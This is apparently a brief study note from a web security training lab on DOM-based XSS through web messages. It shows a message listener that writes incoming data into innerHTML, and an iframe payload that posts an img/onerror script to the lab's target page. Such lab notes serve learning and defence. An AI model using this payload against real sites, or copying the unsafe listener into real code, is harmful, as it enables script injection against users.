
[ WEB > DOM VULNS ]

DOM XSS using web messages

// home page contains javascript listener: addEventListener()
// note that function takes event type and function.
<script>
  window.addEventListener('message', function(e) {
      document.getElementById('ads').innerHTML = e.data;
  })
</script>

// example payload for attacker server
// add onload event with relevant function to trigger event listener on target
<iframe src="https://0a98009a03cae75a82bd421e005a006d.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">


